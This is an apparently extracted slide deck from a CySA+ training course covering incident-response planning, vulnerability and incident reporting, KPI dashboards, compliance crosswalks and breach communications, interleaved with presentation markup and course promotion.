            <a:ext cx="994796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NIST 800-61 incident-response life cycle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CySA+ 3.3 is exactly this loop with two of its four phases broken out.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┌──────────────┐    ┌────────────────┐    ┌─────────────────────┐    ┌────────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Author the high-level IR plan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/tmp/lab25 &amp;&amp; cd /tmp/lab25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Author a one-page phishing playbook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playbook_phishing.md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45-minute tabletop exercise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Scenario (read aloud at T = 0): &gt; "08:00 — A finance user reports an invoice email looked off but opened it.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Capture lessons learned (post-incident)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actions become the inputs to the next Preparation cycle — closing the NIST loop.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hot_wash.md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Training (CySA+ 3.3 "Training")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Schedule four touches per year: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NIST 800-61 IR life cycle and how it maps to CySA+ 3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NIST 800-61 IR life cycle and how it maps to CySA+ 3.3.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Draft a high-level IR plan with RACI, severity, and escala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Draft a high-level IR plan with RACI, severity, and escalation.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one-page playbook for the most common incident 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one-page playbook for the most common incident type.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structured tabletop and capture lessons learned that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structured tabletop and capture lessons learned that feed back into preparation.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4 · 17%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Reporting and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27803"/>
            <a:ext cx="4636008" cy="17498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Vulnerability identification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17%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17%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Stakeholder communication &amp; lessons learned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Vulnerability Management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turn raw OpenVAS / Nmap output into a stakeholder-ready vulnerability report with a risk score, affected hosts, mitigations, and an action plan. This maps to CySA+ 4.1 (Vulnerability management reporting — Vulnerabilities, Affected hosts, Risk score, Mitigation, Recurrence, Prioritization;…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report tooling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pandoc converts Markdown → PDF / HTML / DOCX with one command.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 texlive-latex-base texlive-fonts-recommend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input data (pretend it came from OpenVAS)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columns map directly to CySA+ 4.1's bullet list: Vulnerabilities, Affected hosts, Risk score, Recurrence.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/tmp/lab26 &amp;&amp; cd /tmp/lab26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prioritisation column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Prioritisation logic mirrors CySA+ 2.3 + 4.1: KEV catalog hits and CVSS ≥ 9 are always P1.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-F, 'NR==1 {print $0",Priority"; next}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the executive summary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Render to HTML and (optionally) PDF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report.html in a browser to verify formatting before mailing.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report.md -s -o report.html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Hash and archive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Reports are evidence; hashes prove integrity (and the auditor will check).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report.md report.html prioritised.csv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every section to a CySA+ 4.1 bullet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CySA+ 4.1 bullet | |---|---| | KPI table | Metrics and KPIs (Trends, Top 10, SLOs) | | Top 10 | Top 10 | | Action plan | Action plans…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Prioritise vulnerabilities with KEV + CVSS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Prioritise vulnerabilities with KEV + CVSS.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stakeholder-grade vulnerability report with execu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stakeholder-grade vulnerability report with executive summary, Top 10, action plan, inhibitors, an...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Render Markdown to HTML/PDF with pandoc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Render Markdown to HTML/PDF with pandoc.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every section back to the CySA+ 4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every section back to the CySA+ 4.1 exam blueprint.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Executive Incident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write the executive incident report from the scenario walked in Labs 20, 23, 24. It will satisfy every CySA+ 4.2 bullet: executive summary, Who-What-When-Where-Why, recommendations, timeline, impact, scope, evidence, communications, root cause, lessons learned, metrics.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Use the canonical IR report template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incident_report.md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Render and seal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hash is the seal — once distributed, any edit changes the hash and breaks the audit trail.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incident_report.md -s -o incident_report.html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Map every section to CySA+ 4.2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CySA+ 4.2 bullet | |---|---| | 1 Exec summary | Executive summary | | 2 W/W/W/W/W | Who, what, when, where, and why | | 3 Timeline |…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complete executive incident report that satisfies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complete executive incident report that satisfies every CySA+ 4.2 bullet.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Cleanly link evidence to chain-of-custody (Lab 21)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Cleanly link evidence to chain-of-custody (Lab 21).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Capture lessons learned and KPIs that feed the next prepar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Capture lessons learned and KPIs that feed the next preparation cycle.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Render and seal a report with pandoc + SHA-256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Render and seal a report with pandoc + SHA-256.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Security Metrics Dashboard (MTTD / MTTR)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compute and plot the three KPIs CySA+ 4.2 explicitly calls out — Mean Time To Detect (MTTD), Mean Time To Respond (MTTR), and Mean Time To Remediate (MTTR-rem) — plus alert volume. The output is a one-page PNG dashboard for the monthly CISO review.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Python + matplotlib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last quarter's incident data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Columns map to CySA+ 4.2 KPIs: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/tmp/lab28 &amp;&amp; cd /tmp/lab28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KPIs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CISO target is typically MTTD &lt; 30 min and MTTR-respond &lt; 60 min.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kpis.py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Plot the dashboard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dashboard.png from Killercoda's file browser.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dashboard.py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Identify trends (CySA+ "Trends")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spike in sev-1 month-over-month is the headline finding for the CISO slide.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python3 -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Critical vulnerabilities &amp; zero-day exposure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names "Critical vulnerabilities and zero-days" as a top metric.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SLO scorecard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/ 4.2 "SLOs".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slo.md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Compute MTTD, MTTR-respond, MTTR-remediate, and alert volu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Compute MTTD, MTTR-respond, MTTR-remediate, and alert volume from raw incident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Plot a single-page KPI dashboard with matplotlib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Plot a single-page KPI dashboard with matplotlib.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monthly trends and SLO breaches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monthly trends and SLO breaches.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Combine vulnerability KPIs (P1, zero-day, KEV) with incide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Combine vulnerability KPIs (P1, zero-day, KEV) with incident KPIs into an executive scorecard.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Compliance Reporting (PCI DSS / ISO 27001 / NIST CSF)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produce a compliance crosswalk that maps your lab evidence to PCI DSS, ISO 27001 Annex A, NIST CSF, and CIS Controls v8 — the four frameworks CySA+ 2.1 / 4.1 expects you to recognise. This is the lab the auditor reads.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a crosswalk?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Most organisations are subject to multiple frameworks.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Pull the framework primary sources (free)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internal training, the open OWASP, OSSTMM, and CIS Benchmarks are also useful (CySA+ 2.1 names them).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Build the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crosswalk.md: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Control crosswalk — Lab evidence ↔ Frameworks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compliance evidence files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each control area, produce one named evidence file pointing at the underlying lab artefact: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*.md *.csv *.html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Compliance report skeleton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Compliance Report — Q2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The auditor's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submission, verify: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Periodic regulatory scans (PCI DSS 11.3.2 — ASV)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PCI DSS specifically requires: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crosswalk that prevents duplicate control work acr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crosswalk that prevents duplicate control work across PCI/ISO/CSF/CIS.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Index evidence per control with a unique ID and a hash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Index evidence per control with a unique ID and a hash.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quarterly compliance report skeleton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quarterly compliance report skeleton.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Recognise specific PCI DSS scanning obligations (internal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Recognise specific PCI DSS scanning obligations (internal vs ASV).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Stakeholder Communication and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the four canonical post-incident communications — executive, customer, regulator, public/media — and close the incident with a structured lessons learned and root cause analysis that feeds the next preparation cycle. This maps to CySA+ 4.2 (Communications — Legal, Public relations, Customer…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Identify every stakeholder for CASE-001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Carry the CASE-001 scenario from Lab 27.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Executive briefing template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 screen.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To: CEO, CFO, General Counsel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Customer notification template (GDPR-style)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Plain language.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Subject: Important security notice about your data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Regulator notification (GDPR Art. 33 template)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Submit via the supervisory authority's web portal.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Notification of personal data breach — Art. 33 GDPR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Public / media holding statement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100 words.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We recently identified a cybersecurity incident affecting a limited number of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Law enforcement referral checklist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Root cause analysis — 5 Whys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phrasing matters: blaming the user generates fear, not improvement.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1. Why did the attacker exfiltrate 1 GB? → They had valid credentials and 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Lessons learned register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of this register is the input to next quarter's Preparation phase — closing the NIST loop one more time.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Lessons Learned — CASE-001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Stakeholder map → CySA+ 4.2 final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CySA+ 4.2 bullet | |---|---| | 1 stakeholder map | Stakeholder identification and communication | | 2 executive template | Communications —…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every stakeholder for a sev-1 incident and pick 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every stakeholder for a sev-1 incident and pick the right channel for each.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Draft executive, customer, regulator, and media communicat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Draft executive, customer, regulator, and media communications.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5-Whys RCA that targets process, not people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5-Whys RCA that targets process, not people.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Close the incident with a structured Lessons Learned regis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Close the incident with a structured Lessons Learned register that feeds back into the IR life cycle.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713232"/>
            <a:ext cx="82296" cy="64008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640080"/>
            <a:ext cx="2743200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00" b="1">
                <a:solidFill>
                  <a:srgbClr val="1F6FEB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>PRACTICE EXAM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24128"/>
            <a:ext cx="7955279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3000" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Take the Online CySA+ Practice Exams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719072"/>
            <a:ext cx="1069848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57400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48256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Reinforce all four CySA+ domains with realistic, exam-style questions before assessment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9806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Use practice sets to test Security Operations, Vulnerability Management, Incident Response and Reporting.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52958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2044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Review mode helps you check the correct answer and revisit the concept after each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26110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hlinkClick r:id="rId3"/>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="960120" y="425196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400" b="0" u="none">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Complete the matching CySA+ practice exam from the Tertiary Exams site, then bring difficult items to the review session.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175504"/>
            <a:ext cx="44805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00" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Access the matching Practice Exam:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="TextBox 14">
            <a:hlinkClick r:id="rId3"/>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="749808" y="5440680"/>
            <a:ext cx="452628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400" b="1" u="sng">
                <a:solidFill>
                  <a:srgbClr val="1F6FEB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>exams.tertiaryinfotech.com/practice-exams/comptia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32120" y="1975104"/>
            <a:ext cx="589788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96712" y="2121408"/>
            <a:ext cx="201168" cy="2011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96712" y="2139696"/>
            <a:ext cx="201168" cy="1005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2139696"/>
            <a:ext cx="1051560" cy="1280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720" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Tertiary Exams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148840"/>
            <a:ext cx="68580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Practice Exams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148840"/>
            <a:ext cx="50292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About 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22408" y="2148840"/>
            <a:ext cx="347472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Sign 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07040" y="2093976"/>
            <a:ext cx="530352" cy="2011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34472" y="2139696"/>
            <a:ext cx="475488" cy="822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520" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Get started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3016" y="2724912"/>
            <a:ext cx="164592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1F6FEB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>All exams / CompTIA / CySA+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43016" y="2871216"/>
            <a:ext cx="438912" cy="146304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9592" y="2907792"/>
            <a:ext cx="365760" cy="731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80" b="1">
                <a:solidFill>
                  <a:srgbClr val="1F6FEB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>CompTIA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36792" y="2871216"/>
            <a:ext cx="310896" cy="146304"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F5F8FC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907792"/>
            <a:ext cx="256032" cy="731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80" b="1">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>CS0-003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3016" y="3072384"/>
            <a:ext cx="38862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070" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>CompTIA Cybersecurity Analyst (CySA+) Practice Exams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3016" y="3355848"/>
            <a:ext cx="37033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50" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Practice questions for security operations, vulnerability management, incident response and reporting.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43016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80176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0176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0176" y="4215384"/>
            <a:ext cx="786384" cy="228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022592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9752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FOCUS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9752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CS0-003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4215384"/>
            <a:ext cx="786384" cy="228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02168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9328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8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Website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39328" y="4215384"/>
            <a:ext cx="786384" cy="228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43016" y="4462272"/>
            <a:ext cx="17830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71032" y="4608576"/>
            <a:ext cx="137160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30" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Practice mode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71032" y="4791456"/>
            <a:ext cx="141732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Check answers and explanations while revising each domain.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4462272"/>
            <a:ext cx="17830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00416" y="4608576"/>
            <a:ext cx="137160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30" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Timed 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00416" y="4791456"/>
            <a:ext cx="141732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Build confidence before the final assessment and Q&amp;A.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43016" y="5221224"/>
            <a:ext cx="3712463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71032" y="5358384"/>
            <a:ext cx="109728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20" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Domains covered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71032" y="5550408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02752" y="5550408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33%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71032" y="5696712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71032" y="5696712"/>
            <a:ext cx="2500230" cy="3200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71032" y="5705856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02752" y="5705856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30%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71032" y="5852160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71032" y="5852160"/>
            <a:ext cx="2272937" cy="3200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71032" y="5861304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Incident Response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02752" y="5861304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20%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71032" y="6007608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71032" y="6007608"/>
            <a:ext cx="1515291" cy="320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71032" y="6016752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Reporting &amp; Communication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02752" y="6016752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17%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71032" y="6163056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971032" y="6163056"/>
            <a:ext cx="1287997" cy="3200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902952" y="3118104"/>
            <a:ext cx="1170432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30968" y="3273552"/>
            <a:ext cx="91440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0" b="1">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>PRACTICE DETAILS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30968" y="3493008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Exam code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61320" y="3493008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CS0-003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30968" y="3657600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Use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61320" y="3657600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30968" y="3822192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Domains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61320" y="3822192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02952" y="4306824"/>
            <a:ext cx="1170432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30968" y="4443984"/>
            <a:ext cx="27432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1">
                <a:solidFill>
                  <a:srgbClr val="1F6FEB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>FREE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30968" y="4626864"/>
            <a:ext cx="86868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9" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Start with the online practice set.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030968" y="4873752"/>
            <a:ext cx="868680" cy="164592"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F5F8FC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67544" y="4914900"/>
            <a:ext cx="795528" cy="640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70" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Open practice exam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902952" y="5340096"/>
            <a:ext cx="1170432" cy="749808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30968" y="5468112"/>
            <a:ext cx="73152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1">
                <a:solidFill>
                  <a:srgbClr val="1F6FEB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Learner tip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30968" y="5660136"/>
            <a:ext cx="896112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0" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Retake missed items after revision.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Summary &amp;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Cert &amp; TRAQOM Survey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mandatory TRAQOM survey and claim your certificate via the LMS/TMS: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Scan the QR code shown by your trainer/administrator and submit your attendance.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Assessment Flow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2110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9270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13862" y="2313432"/>
            <a:ext cx="438912" cy="43891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3862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0438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3012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0172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4764" y="2313432"/>
            <a:ext cx="438912" cy="43891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04764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3915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1075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95667" y="2313432"/>
            <a:ext cx="438912" cy="43891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5667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2243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4817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21977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6569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86569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3145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846320"/>
            <a:ext cx="978408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0">
                <a:solidFill>
                  <a:srgbClr val="5B6372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Recommended Courses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Server+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A+ Training (Core 1 &amp; Core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Linux+ Training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7327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PenTest+ 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Security+ Training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CySA+ (Refresher)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68020"/>
            <a:ext cx="4636008" cy="246943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Impersonation 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If you have any enquiries during and after the class, you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If you have any enquiries during and after the class, you can contact us below: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56332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82092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Email: enquiry@tertiaryinfotech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150108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Email: enquiry@tertiaryinfotech.com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31336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Tel: +65 6100 0613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325112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Tel: +65 6100 0613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006340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5170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Website: www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5500116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Website: www.tertiarycourses.com.sg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55448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310896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7200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www.tertiarycourses.com.sg  ·  enquiry@tertiaryinfotech.com  ·  +65 6100 0613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2</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-01-27T09:14:16Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-07-13T12:28:01Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>